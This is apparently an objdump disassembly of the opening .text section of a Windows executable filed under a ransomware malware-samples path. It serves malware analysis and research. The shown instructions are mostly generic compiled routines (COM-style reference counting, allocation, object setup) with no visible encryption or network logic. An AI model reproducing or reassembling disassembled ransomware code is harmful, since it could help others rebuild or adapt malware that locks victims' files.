
malware_samples/ransomware/00202340108c101d59bbfb3daa4bbd6b4436c167e3c9734c07bfbdcb1402f746.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001004:	ba 01 00 00 00       	mov    $0x1,%edx
   140001009:	48 ff 25 c8 45 02 00 	rex.W jmp *0x245c8(%rip)        # 0x1400255d8
   140001010:	40 53                	rex push %rbx
   140001012:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   140001019:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000101e:	e8 91 85 00 00       	call   0x1400095b4
   140001023:	48 8d 05 96 4a 02 00 	lea    0x24a96(%rip),%rax        # 0x140025ac0
   14000102a:	48 8d 8c 24 b8 00 00 	lea    0xb8(%rsp),%rcx
   140001031:	00 
   140001032:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001037:	c7 84 24 80 00 00 00 	movl   $0x7d2,0x80(%rsp)
   14000103e:	d2 07 00 00 
   140001042:	e8 11 84 01 00       	call   0x140019458
   140001047:	48 8b 05 02 bb 02 00 	mov    0x2bb02(%rip),%rax        # 0x14002cb50
   14000104e:	c7 84 24 80 00 00 00 	movl   $0x7d7,0x80(%rsp)
   140001055:	d7 07 00 00 
   140001059:	48 85 c0             	test   %rax,%rax
   14000105c:	75 08                	jne    0x140001066
   14000105e:	8d 48 2c             	lea    0x2c(%rax),%ecx
   140001061:	e8 3a 3a 00 00       	call   0x140004aa0
   140001066:	48 8b 0d b3 bc 02 00 	mov    0x2bcb3(%rip),%rcx        # 0x14002cd20
   14000106d:	4c 8b 05 d4 ba 02 00 	mov    0x2bad4(%rip),%r8        # 0x14002cb48
   140001074:	4c 8b c8             	mov    %rax,%r9
   140001077:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000107c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001081:	ba 03 00 00 00       	mov    $0x3,%edx
   140001086:	e8 91 89 00 00       	call   0x140009a1c
   14000108b:	48 85 c0             	test   %rax,%rax
   14000108e:	74 21                	je     0x1400010b1
   140001090:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   140001097:	00 
   140001098:	48 8d 0d 09 ba 02 00 	lea    0x2ba09(%rip),%rcx        # 0x14002caa8
   14000109f:	e8 84 84 01 00       	call   0x140019528
   1400010a4:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400010a9:	88 1d f1 b9 02 00    	mov    %bl,0x2b9f1(%rip)        # 0x14002caa0
   1400010af:	eb 0d                	jmp    0x1400010be
   1400010b1:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400010b6:	01 1d e8 b9 02 00    	add    %ebx,0x2b9e8(%rip)        # 0x14002caa4
   1400010bc:	33 db                	xor    %ebx,%ebx
   1400010be:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
   1400010c5:	00 
   1400010c6:	e8 a3 2c 02 00       	call   0x140023d6e
   1400010cb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400010d0:	e8 5f 85 00 00       	call   0x140009634
   1400010d5:	8b c3                	mov    %ebx,%eax
   1400010d7:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   1400010de:	5b                   	pop    %rbx
   1400010df:	c3                   	ret
   1400010e0:	49 83 20 00          	andq   $0x0,(%r8)
   1400010e4:	4c 8b 12             	mov    (%rdx),%r10
   1400010e7:	4c 8d 1d 12 ef ff ff 	lea    -0x10ee(%rip),%r11        # 0x140000000
   1400010ee:	4d 8b c8             	mov    %r8,%r9
   1400010f1:	4d 3b 93 a0 89 02 00 	cmp    0x289a0(%r11),%r10
   1400010f8:	75 11                	jne    0x14000110b
   1400010fa:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   1400010fe:	4d 3b 93 a8 89 02 00 	cmp    0x289a8(%r11),%r10
   140001105:	75 04                	jne    0x14000110b
   140001107:	33 c0                	xor    %eax,%eax
   140001109:	eb 05                	jmp    0x140001110
   14000110b:	1b c0                	sbb    %eax,%eax
   14000110d:	83 d8 ff             	sbb    $0xffffffff,%eax
   140001110:	85 c0                	test   %eax,%eax
   140001112:	75 05                	jne    0x140001119
   140001114:	49 89 08             	mov    %rcx,(%r8)
   140001117:	eb 29                	jmp    0x140001142
   140001119:	4c 8b 02             	mov    (%rdx),%r8
   14000111c:	4d 3b 83 b0 58 02 00 	cmp    0x258b0(%r11),%r8
   140001123:	75 11                	jne    0x140001136
   140001125:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140001129:	4d 3b 83 b8 58 02 00 	cmp    0x258b8(%r11),%r8
   140001130:	75 04                	jne    0x140001136
   140001132:	33 c0                	xor    %eax,%eax
   140001134:	eb 05                	jmp    0x14000113b
   140001136:	1b c0                	sbb    %eax,%eax
   140001138:	83 d8 ff             	sbb    $0xffffffff,%eax
   14000113b:	85 c0                	test   %eax,%eax
   14000113d:	75 09                	jne    0x140001148
   14000113f:	49 89 09             	mov    %rcx,(%r9)
   140001142:	ff 41 08             	incl   0x8(%rcx)
   140001145:	33 c0                	xor    %eax,%eax
   140001147:	c3                   	ret
   140001148:	b8 02 40 00 80       	mov    $0x80004002,%eax
   14000114d:	c3                   	ret
   14000114e:	cc                   	int3
   14000114f:	cc                   	int3
   140001150:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001155:	57                   	push   %rdi
   140001156:	48 83 ec 20          	sub    $0x20,%rsp
   14000115a:	48 8b f9             	mov    %rcx,%rdi
   14000115d:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140001164:	8b da                	mov    %edx,%ebx
   140001166:	e8 03 2c 02 00       	call   0x140023d6e
   14000116b:	48 8b cf             	mov    %rdi,%rcx
   14000116e:	e8 c1 84 00 00       	call   0x140009634
   140001173:	f6 c3 01             	test   $0x1,%bl
   140001176:	74 08                	je     0x140001180
   140001178:	48 8b cf             	mov    %rdi,%rcx
   14000117b:	e8 ee 2b 02 00       	call   0x140023d6e
   140001180:	48 8b c7             	mov    %rdi,%rax
   140001183:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001188:	48 83 c4 20          	add    $0x20,%rsp
   14000118c:	5f                   	pop    %rdi
   14000118d:	c3                   	ret
   14000118e:	cc                   	int3
   14000118f:	cc                   	int3
   140001190:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001195:	57                   	push   %rdi
   140001196:	48 83 ec 20          	sub    $0x20,%rsp
   14000119a:	8b da                	mov    %edx,%ebx
   14000119c:	48 8b f9             	mov    %rcx,%rdi
   14000119f:	e8 90 84 00 00       	call   0x140009634
   1400011a4:	f6 c3 01             	test   $0x1,%bl
   1400011a7:	74 08                	je     0x1400011b1
   1400011a9:	48 8b cf             	mov    %rdi,%rcx
   1400011ac:	e8 bd 2b 02 00       	call   0x140023d6e
   1400011b1:	48 8b c7             	mov    %rdi,%rax
   1400011b4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400011b9:	48 83 c4 20          	add    $0x20,%rsp
   1400011bd:	5f                   	pop    %rdi
   1400011be:	c3                   	ret
   1400011bf:	cc                   	int3
   1400011c0:	40 53                	rex push %rbx
   1400011c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400011c6:	80 3d d3 b8 02 00 00 	cmpb   $0x0,0x2b8d3(%rip)        # 0x14002caa0
   1400011cd:	48 8b d9             	mov    %rcx,%rbx
   1400011d0:	75 19                	jne    0x1400011eb
   1400011d2:	f6 05 87 b9 02 00 08 	testb  $0x8,0x2b987(%rip)        # 0x14002cb60
   1400011d9:	75 09                	jne    0x1400011e4
   1400011db:	e8 30 fe ff ff       	call   0x140001010
   1400011e0:	85 c0                	test   %eax,%eax
   1400011e2:	75 07                	jne    0x1400011eb
   1400011e4:	b8 05 40 00 80       	mov    $0x80004005,%eax
   1400011e9:	eb 1c                	jmp    0x140001207
   1400011eb:	48 8b 0d b6 b8 02 00 	mov    0x2b8b6(%rip),%rcx        # 0x14002caa8
   1400011f2:	ff 15 d0 41 02 00    	call   *0x241d0(%rip)        # 0x1400253c8
   1400011f8:	48 89 03             	mov    %rax,(%rbx)
   1400011fb:	48 f7 d8             	neg    %rax
   1400011fe:	1b c0                	sbb    %eax,%eax
   140001200:	f7 d0                	not    %eax
   140001202:	25 0e 00 07 80       	and    $0x8007000e,%eax
   140001207:	48 83 c4 20          	add    $0x20,%rsp
   14000120b:	5b                   	pop    %rbx
   14000120c:	c3                   	ret
   14000120d:	cc                   	int3
   14000120e:	cc                   	int3
   14000120f:	cc                   	int3
   140001210:	48 83 ec 28          	sub    $0x28,%rsp
   140001214:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140001218:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000121d:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001222:	48 8b 01             	mov    (%rcx),%rax
   140001225:	ff 50 28             	call   *0x28(%rax)
   140001228:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000122c:	48 83 c4 28          	add    $0x28,%rsp
   140001230:	c3                   	ret
   140001231:	cc                   	int3
   140001232:	cc                   	int3
   140001233:	cc                   	int3
   140001234:	8b 41 10             	mov    0x10(%rcx),%eax
   140001237:	ff c0                	inc    %eax
   140001239:	89 41 10             	mov    %eax,0x10(%rcx)
   14000123c:	c3                   	ret
   14000123d:	cc                   	int3
   14000123e:	cc                   	int3
   14000123f:	cc                   	int3
   140001240:	48 83 ec 28          	sub    $0x28,%rsp
   140001244:	ff 49 10             	decl   0x10(%rcx)
   140001247:	8b 41 10             	mov    0x10(%rcx),%eax
   14000124a:	75 07                	jne    0x140001253
   14000124c:	e8 1d 2b 02 00       	call   0x140023d6e
   140001251:	33 c0                	xor    %eax,%eax
   140001253:	48 83 c4 28          	add    $0x28,%rsp
   140001257:	c3                   	ret
   140001258:	48 83 e9 08          	sub    $0x8,%rcx
   14000125c:	e9 df ff ff ff       	jmp    0x140001240
   140001261:	cc                   	int3
   140001262:	cc                   	int3
   140001263:	cc                   	int3
   140001264:	40 53                	rex push %rbx
   140001266:	48 83 ec 20          	sub    $0x20,%rsp
   14000126a:	ff 49 08             	decl   0x8(%rcx)
   14000126d:	8b 41 08             	mov    0x8(%rcx),%eax
   140001270:	48 8b d9             	mov    %rcx,%rbx
   140001273:	75 13                	jne    0x140001288
   140001275:	48 83 c1 10          	add    $0x10,%rcx
   140001279:	e8 f6 a9 01 00       	call   0x14001bc74
   14000127e:	48 8b cb             	mov    %rbx,%rcx
   140001281:	e8 e8 2a 02 00       	call   0x140023d6e
   140001286:	33 c0                	xor    %eax,%eax
   140001288:	48 83 c4 20          	add    $0x20,%rsp
   14000128c:	5b                   	pop    %rbx
   14000128d:	c3                   	ret
   14000128e:	cc                   	int3
   14000128f:	cc                   	int3
   140001290:	40 53                	rex push %rbx
   140001292:	48 83 ec 20          	sub    $0x20,%rsp
   140001296:	48 8d 05 fb 6a 02 00 	lea    0x26afb(%rip),%rax        # 0x140027d98
   14000129d:	48 8b d9             	mov    %rcx,%rbx
   1400012a0:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400012a4:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   1400012a8:	48 8d 05 61 49 02 00 	lea    0x24961(%rip),%rax        # 0x140025c10
   1400012af:	48 89 01             	mov    %rax,(%rcx)
   1400012b2:	48 8d 05 2f 49 02 00 	lea    0x2492f(%rip),%rax        # 0x140025be8
   1400012b9:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400012bd:	48 83 61 20 00       	andq   $0x0,0x20(%rcx)
   1400012c2:	b9 28 00 00 00       	mov    $0x28,%ecx
   1400012c7:	e8 ae 2a 02 00       	call   0x140023d7a
   1400012cc:	48 85 c0             	test   %rax,%rax
   1400012cf:	74 1d                	je     0x1400012ee
   1400012d1:	83 60 08 00          	andl   $0x0,0x8(%rax)
   1400012d5:	48 8d 0d a4 48 02 00 	lea    0x248a4(%rip),%rcx        # 0x140025b80
   1400012dc:	48 89 08             	mov    %rcx,(%rax)
   1400012df:	48 83 60 10 00       	andq   $0x0,0x10(%rax)
   1400012e4:	48 83 60 18 00       	andq   $0x0,0x18(%rax)
   1400012e9:	48 83 60 20 00       	andq   $0x0,0x20(%rax)
   1400012ee:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400012f2:	48 8b c3             	mov    %rbx,%rax
   1400012f5:	48 83 c4 20          	add    $0x20,%rsp
   1400012f9:	5b                   	pop    %rbx
   1400012fa:	c3                   	ret
   1400012fb:	cc                   	int3
   1400012fc:	33 c0                	xor    %eax,%eax
   1400012fe:	c3                   	ret
   1400012ff:	cc                   	int3
   140001300:	48 8b ca             	mov    %rdx,%rcx
   140001303:	e9 b8 fe ff ff       	jmp    0x1400011c0
   140001308:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000130d:	57                   	push   %rdi
   14000130e:	48 83 ec 20          	sub    $0x20,%rsp
   140001312:	48 8b fa             	mov    %rdx,%rdi
   140001315:	48 8b d9             	mov    %rcx,%rbx
   140001318:	e8 f3 fe ff ff       	call   0x140001210
   14000131d:	85 c0                	test   %eax,%eax
   14000131f:	75 25                	jne    0x140001346
   140001321:	48 8b 0b             	mov    (%rbx),%rcx
   140001324:	39 41 30             	cmp    %eax,0x30(%rcx)
   140001327:	75 1d                	jne    0x140001346
   140001329:	48 8b 01             	mov    (%rcx),%rax
   14000132c:	45 33 c9             	xor    %r9d,%r9d
   14000132f:	45 33 c0             	xor    %r8d,%r8d
   140001332:	33 d2                	xor    %edx,%edx
   140001334:	ff 50 20             	call   *0x20(%rax)
   140001337:	48 8b 0b             	mov    (%rbx),%rcx
   14000133a:	48 8b d7             	mov    %rdi,%rdx
   14000133d:	e8 42 ba 00 00       	call   0x14000cd84
   140001342:	84 c0                	test   %al,%al
   140001344:	74 02                	je     0x140001348
   140001346:	b0 01                	mov    $0x1,%al
   140001348:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000134d:	48 83 c4 20          	add    $0x20,%rsp
   140001351:	5f                   	pop    %rdi
   140001352:	c3                   	ret
   140001353:	cc                   	int3
   140001354:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001359:	57                   	push   %rdi
   14000135a:	48 83 ec 20          	sub    $0x20,%rsp
   14000135e:	48 8b f9             	mov    %rcx,%rdi
   140001361:	e8 aa fe ff ff       	call   0x140001210
   140001366:	85 c0                	test   %eax,%eax
   140001368:	74 04                	je     0x14000136e
   14000136a:	b0 01                	mov    $0x1,%al
   14000136c:	eb 69                	jmp    0x1400013d7
   14000136e:	b9 18 00 00 00       	mov    $0x18,%ecx
   140001373:	e8 02 2a 02 00       	call   0x140023d7a
   140001378:	48 8b d8             	mov    %rax,%rbx
   14000137b:	48 85 c0             	test   %rax,%rax
   14000137e:	74 26                	je     0x1400013a6
   140001380:	48 8d 05 11 6a 02 00 	lea    0x26a11(%rip),%rax        # 0x140027d98
   140001387:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000138b:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   14000138f:	48 8d 05 2a 48 02 00 	lea    0x2482a(%rip),%rax        # 0x140025bc0
   140001396:	48 89 03             	mov    %rax,(%rbx)
   140001399:	48 8d 05 00 48 02 00 	lea    0x24800(%rip),%rax        # 0x140025ba0
   1400013a0:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1400013a4:	eb 02                	jmp    0x1400013a8
   1400013a6:	33 db                	xor    %ebx,%ebx
   1400013a8:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400013ac:	45 33 c9             	xor    %r9d,%r9d
   1400013af:	45 33 c0             	xor    %r8d,%r8d
   1400013b2:	48 8b 01             	mov    (%rcx),%rax
   1400013b5:	33 d2                	xor    %edx,%edx
   1400013b7:	ff 50 20             	call   *0x20(%rax)
   1400013ba:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   1400013be:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   1400013c2:	48 8b 01             	mov    (%rcx),%rax
   1400013c5:	4c 8d 05 44 5e 02 00 	lea    0x25e44(%rip),%r8        # 0x140027210
   1400013cc:	4c 8b cb             	mov    %rbx,%r9
   1400013cf:	ff 50 18             	call   *0x18(%rax)
   1400013d2:	85 c0                	test   %eax,%eax
   1400013d4:	0f 94 c0             	sete   %al
   1400013d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400013dc:	48 83 c4 20          	add    $0x20,%rsp
   1400013e0:	5f                   	pop    %rdi
   1400013e1:	c3                   	ret
   1400013e2:	cc                   	int3
   1400013e3:	cc                   	int3
   1400013e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400013e9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400013ee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400013f3:	57                   	push   %rdi
   1400013f4:	41 54                	push   %r12
   1400013f6:	41 55                	push   %r13
   1400013f8:	48 83 ec 30          	sub    $0x30,%rsp
   1400013fc:	f6 05 5d b7 02 00 40 	testb  $0x40,0x2b75d(%rip)        # 0x14002cb60
   140001403:	4c 8b e1             	mov    %rcx,%r12
   140001406:	0f 85 0c 01 00 00    	jne    0x140001518
   14000140c:	83 3d 91 b6 02 00 00 	cmpl   $0x0,0x2b691(%rip)        # 0x14002caa4
   140001413:	0f 8f ff 00 00 00    	jg     0x140001518
   140001419:	e8 36 ff ff ff       	call   0x140001354
   14000141e:	84 c0                	test   %al,%al
   140001420:	0f 84 f2 00 00 00    	je     0x140001518
   140001426:	49 8b cc             	mov    %r12,%rcx
   140001429:	e8 e2 fd ff ff       	call   0x140001210
   14000142e:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001435:	44 8b e8             	mov    %eax,%r13d
   140001438:	b8 04 00 00 00       	mov    $0x4,%eax
   14000143d:	49 f7 e5             	mul    %r13
   140001440:	48 0f 40 c1          	cmovo  %rcx,%rax
   140001444:	48 8b c8             	mov    %rax,%rcx
   140001447:	e8 2e 29 02 00       	call   0x140023d7a
   14000144c:	33 ed                	xor    %ebp,%ebp
   14000144e:	33 db                	xor    %ebx,%ebx
   140001450:	48 8b f8             	mov    %rax,%rdi
   140001453:	45 85 ed             	test   %r13d,%r13d
   140001456:	0f 84 b4 00 00 00    	je     0x140001510
   14000145c:	48 8b f0             	mov    %rax,%rsi
   14000145f:	8b cb                	mov    %ebx,%ecx
   140001461:	e8 82 7c 00 00       	call   0x1400090e8
   140001466:	84 c0                	test   %al,%al
   140001468:	74 08                	je     0x140001472
   14000146a:	89 1e                	mov    %ebx,(%rsi)
   14000146c:	ff c5                	inc    %ebp
   14000146e:	48 83 c6 04          	add    $0x4,%rsi
   140001472:	ff c3                	inc    %ebx
   140001474:	41 3b dd             	cmp    %r13d,%ebx
   140001477:	72 e6                	jb     0x14000145f
   140001479:	85 ed                	test   %ebp,%ebp
   14000147b:	0f 84 8f 00 00 00    	je     0x140001510
   140001481:	b9 28 00 00 00       	mov    $0x28,%ecx
   140001486:	e8 ef 28 02 00       	call   0x140023d7a
   14000148b:	48 85 c0             	test   %rax,%rax
   14000148e:	74 0d                	je     0x14000149d
   140001490:	48 8b c8             	mov    %rax,%rcx
   140001493:	e8 f8 fd ff ff       	call   0x140001290
   140001498:	48 8b d8             	mov    %rax,%rbx
   14000149b:	eb 02                	jmp    0x14000149f
   14000149d:	33 db                	xor    %ebx,%ebx
   14000149f:	48 85 db             	test   %rbx,%rbx
   1400014a2:	74 09                	je     0x1400014ad
   1400014a4:	48 8b 03             	mov    (%rbx),%rax
   1400014a7:	48 8b cb             	mov    %rbx,%rcx
   1400014aa:	ff 50 08             	call   *0x8(%rax)
   1400014ad:	ff 15 4d 3e 02 00    	call   *0x23e4d(%rip)        # 0x140025300
   1400014b3:	49 8b 4c 24 10       	mov    0x10(%r12),%rcx
   1400014b8:	45 33 c9             	xor    %r9d,%r9d
   1400014bb:	41 89 84 24 c8 00 00 	mov    %eax,0xc8(%r12)
   1400014c2:	00 
   1400014c3:	4c 8b 11             	mov    (%rcx),%r10
   1400014c6:	44 8b c5             	mov    %ebp,%r8d
   1400014c9:	48 8b d7             	mov    %rdi,%rdx
   1400014cc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400014d1:	41 ff 52 38          	call   *0x38(%r10)
   1400014d5:	85 c0                	test   %eax,%eax
   1400014d7:	75 1f                	jne    0x1400014f8
   1400014d9:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   1400014dd:	39 41 20             	cmp    %eax,0x20(%rcx)
   1400014e0:	74 16                	je     0x1400014f8
   1400014e2:	48 8b cf             	mov    %rdi,%rcx
   1400014e5:	e8 84 28 02 00       	call   0x140023d6e
   1400014ea:	4c 8b 1b             	mov    (%rbx),%r11
   1400014ed:	48 8b cb             	mov    %rbx,%rcx
   1400014f0:	41 ff 53 10          	call   *0x10(%r11)
   1400014f4:	b0 01                	mov    $0x1,%al
   1400014f6:	eb 22                	jmp    0x14000151a
   1400014f8:	48 8b cf             	mov    %rdi,%rcx
   1400014fb:	e8 6e 28 02 00       	call   0x140023d6e
   140001500:	48 85 db             	test   %rbx,%rbx
   140001503:	74 13                	je     0x140001518
   140001505:	48 8b 03             	mov    (%rbx),%rax
   140001508:	48 8b cb             	mov    %rbx,%rcx
   14000150b:	ff 50 10             	call   *0x10(%rax)
   14000150e:	eb 08                	jmp    0x140001518
   140001510:	48 8b cf             	mov    %rdi,%rcx
   140001513:	e8 56 28 02 00       	call   0x140023d6e
   140001518:	32 c0                	xor    %al,%al
   14000151a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000151f:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140001524:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140001529:	48 83 c4 30          	add    $0x30,%rsp
   14000152d:	41 5d                	pop    %r13
   14000152f:	41 5c                	pop    %r12
   140001531:	5f                   	pop    %rdi
   140001532:	c3                   	ret
   140001533:	cc                   	int3
   140001534:	40 53                	rex push %rbx
   140001536:	48 83 ec 20          	sub    $0x20,%rsp
   14000153a:	ff 49 10             	decl   0x10(%rcx)
   14000153d:	8b 41 10             	mov    0x10(%rcx),%eax
   140001540:	48 8b d9             	mov    %rcx,%rbx
   140001543:	75 19                	jne    0x14000155e
   140001545:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   140001549:	48 85 c9             	test   %rcx,%rcx
   14000154c:	74 06                	je     0x140001554
   14000154e:	48 8b 01             	mov    (%rcx),%rax
   140001551:	ff 50 10             	call   *0x10(%rax)
   140001554:	48 8b cb             	mov    %rbx,%rcx
   140001557:	e8 12 28 02 00       	call   0x140023d6e
   14000155c:	33 c0                	xor    %eax,%eax
   14000155e:	48 83 c4 20          	add    $0x20,%rsp
   140001562:	5b                   	pop    %rbx
   140001563:	c3                   	ret
   140001564:	49 83 20 00          	andq   $0x0,(%r8)
   140001568:	4c 8b 12             	mov    (%rdx),%r10
   14000156b:	4c 8d 1d 8e ea ff ff 	lea    -0x1572(%rip),%r11        # 0x140000000
   140001572:	4d 8b c8             	mov    %r8,%r9
   140001575:	4d 3b 93 a0 89 02 00 	cmp    0x289a0(%r11),%r10
   14000157c:	75 11                	jne    0x14000158f
   14000157e:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   140001582:	4d 3b 93 a8 89 02 00 	cmp    0x289a8(%r11),%r10
   140001589:	75 04                	jne    0x14000158f
   14000158b:	33 c0                	xor    %eax,%eax
   14000158d:	eb 05                	jmp    0x140001594
   14000158f:	1b c0                	sbb    %eax,%eax
   140001591:	83 d8 ff             	sbb    $0xffffffff,%eax
   140001594:	85 c0                	test   %eax,%eax
   140001596:	75 05                	jne    0x14000159d
   140001598:	49 89 08             	mov    %rcx,(%r8)
   14000159b:	eb 29                	jmp    0x1400015c6
   14000159d:	4c 8b 02             	mov    (%rdx),%r8
   1400015a0:	4d 3b 83 c0 58 02 00 	cmp    0x258c0(%r11),%r8
   1400015a7:	75 11                	jne    0x1400015ba
   1400015a9:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   1400015ad:	4d 3b 83 c8 58 02 00 	cmp    0x258c8(%r11),%r8
   1400015b4:	75 04                	jne    0x1400015ba
   1400015b6:	33 c0                	xor    %eax,%eax
   1400015b8:	eb 05                	jmp    0x1400015bf
   1400015ba:	1b c0                	sbb    %eax,%eax
   1400015bc:	83 d8 ff             	sbb    $0xffffffff,%eax
   1400015bf:	85 c0                	test   %eax,%eax
   1400015c1:	75 09                	jne    0x1400015cc
   1400015c3:	49 89 09             	mov    %rcx,(%r9)
   1400015c6:	ff 41 08             	incl   0x8(%rcx)
   1400015c9:	33 c0                	xor    %eax,%eax
   1400015cb:	c3                   	ret
   1400015cc:	b8 02 40 00 80       	mov    $0x80004002,%eax
   1400015d1:	c3                   	ret
   1400015d2:	cc                   	int3
   1400015d3:	cc                   	int3
   1400015d4:	48 83 e9 08          	sub    $0x8,%rcx
   1400015d8:	e9 57 ff ff ff       	jmp    0x140001534
   1400015dd:	cc                   	int3
   1400015de:	cc                   	int3
   1400015df:	cc                   	int3
   1400015e0:	40 53                	rex push %rbx
   1400015e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400015e6:	ff 49 08             	decl   0x8(%rcx)
   1400015e9:	8b 41 08             	mov    0x8(%rcx),%eax
   1400015ec:	48 8b d9             	mov    %rcx,%rbx
   1400015ef:	75 13                	jne    0x140001604
   1400015f1:	48 83 c1 28          	add    $0x28,%rcx
   1400015f5:	e8 66 ae 01 00       	call   0x14001c460
   1400015fa:	48 8b cb             	mov    %rbx,%rcx
   1400015fd:	e8 6c 27 02 00       	call   0x140023d6e
   140001602:	33 c0                	xor    %eax,%eax
   140001604:	48 83 c4 20          	add    $0x20,%rsp
   140001608:	5b                   	pop    %rbx
   140001609:	c3                   	ret
   14000160a:	cc                   	int3
   14000160b:	cc                   	int3
   14000160c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001611:	57                   	push   %rdi
   140001612:	48 83 ec 20          	sub    $0x20,%rsp
   140001616:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   14000161b:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140001620:	48 8b f9             	mov    %rcx,%rdi
   140001623:	48 83 c1 28          	add    $0x28,%rcx
   140001627:	e8 2c 7e 01 00       	call   0x140019458
   14000162c:	48 8d 4f 38          	lea    0x38(%rdi),%rcx
   140001630:	e8 23 7e 01 00       	call   0x140019458
   140001635:	48 8d 4f 48          	lea    0x48(%rdi),%rcx
   140001639:	e8 1a 7e 01 00       	call   0x140019458
   14000163e:	48 8d 4f 58          	lea    0x58(%rdi),%rcx
   140001642:	e8 6d 7f 00 00       	call   0x1400095b4
   140001647:	4c 8d 1d d2 44 02 00 	lea    0x244d2(%rip),%r11        # 0x140025b20
   14000164e:	b9 38 00 00 00       	mov    $0x38,%ecx
   140001653:	4c 89 5f 58          	mov    %r11,0x58(%rdi)
   140001657:	c7 87 a8 00 00 00 d8 	movl   $0x7d8,0xa8(%rdi)
   14000165e:	07 00 00 
   140001661:	e8 14 27 02 00       	call   0x140023d7a
   140001666:	48 8b d8             	mov    %rax,%rbx
   140001669:	48 85 c0             	test   %rax,%rax
   14000166c:	74 1d                	je     0x14000168b
   14000166e:	83 60 08 00          	andl   $0x0,0x8(%rax)
   140001672:	48 83 60 28 00       	andq   $0x0,0x28(%rax)
   140001677:	83 60 30 00          	andl   $0x0,0x30(%rax)
   14000167b:	83 60 34 00          	andl   $0x0,0x34(%rax)
   14000167f:	48 8d 05 ca 45 02 00 	lea    0x245ca(%rip),%rax        # 0x140025c50
   140001686:	48 89 03             	mov    %rax,(%rbx)
   140001689:	eb 02                	jmp    0x14000168d
   14000168b:	33 db                	xor    %ebx,%ebx
   14000168d:	48 89 1f             	mov    %rbx,(%rdi)
   140001690:	48 85 db             	test   %rbx,%rbx
   140001693:	74 09                	je     0x14000169e
   140001695:	48 8b 03             	mov    (%rbx),%rax
   140001698:	48 8b cb             	mov    %rbx,%rcx
   14000169b:	ff 50 08             	call   *0x8(%rax)
   14000169e:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1400016a2:	48 85 c9             	test   %rcx,%rcx
   1400016a5:	74 06                	je     0x1400016ad
   1400016a7:	48 8b 01             	mov    (%rcx),%rax
   1400016aa:	ff 50 10             	call   *0x10(%rax)
   1400016ad:	b9 e0 01 00 00       	mov    $0x1e0,%ecx
   1400016b2:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   1400016b6:	e8 bf 26 02 00       	call   0x140023d7a
   1400016bb:	48 85 c0             	test   %rax,%rax
   1400016be:	74 0d                	je     0x1400016cd
   1400016c0:	48 8b c8             	mov    %rax,%rcx
   1400016c3:	e8 e0 d7 01 00       	call   0x14001eea8
   1400016c8:	48 8b d8             	mov    %rax,%rbx
   1400016cb:	eb 02                	jmp    0x1400016cf
   1400016cd:	33 db                	xor    %ebx,%ebx
   1400016cf:	48 85 db             	test   %rbx,%rbx
   1400016d2:	74 09                	je     0x1400016dd
   1400016d4:	48 8b 03             	mov    (%rbx),%rax
   1400016d7:	48 8b cb             	mov    %rbx,%rcx
   1400016da:	ff 50 08             	call   *0x8(%rax)
   1400016dd:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   1400016e1:	48 85 c9             	test   %rcx,%rcx
   1400016e4:	74 06                	je     0x1400016ec
   1400016e6:	48 8b 01             	mov    (%rcx),%rax
   1400016e9:	ff 50 10             	call   *0x10(%rax)
   1400016ec:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
